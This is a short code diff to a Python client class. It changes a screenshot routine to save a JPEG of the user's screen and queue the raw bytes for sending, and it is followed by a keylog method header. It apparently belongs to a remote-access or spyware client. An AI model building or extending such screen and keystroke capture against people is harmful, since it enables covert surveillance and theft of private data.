@@ -60,13 +60,13 @@ class Client:
 
     def screenshot(self):
         #TODO: Fill this in
-        ImageGrab.grab().save("C:\Users\Matt\Desktop\scrnsht.png", "PNG")
+        ImageGrab.grab().save("C:\Users\Matt\Desktop\scrnsht.jpg", "JPEG")
         # img = ImageGrab.grab()
-        f = open('C:\Users\matt\Desktop\scrnsht.png', 'rb')
+        f = open('C:\Users\matt\Desktop\scrnsht.jpg', 'rb')
         fread = f.read()
-        imgstr = base64.b64encode(fread)
-        size = str(len(imgstr))
-        data = imgstr
+        f.close()
+        size = str(len(fread))
+        data = fread
         self.enqueue(size,data)
 
     def keylog(self):
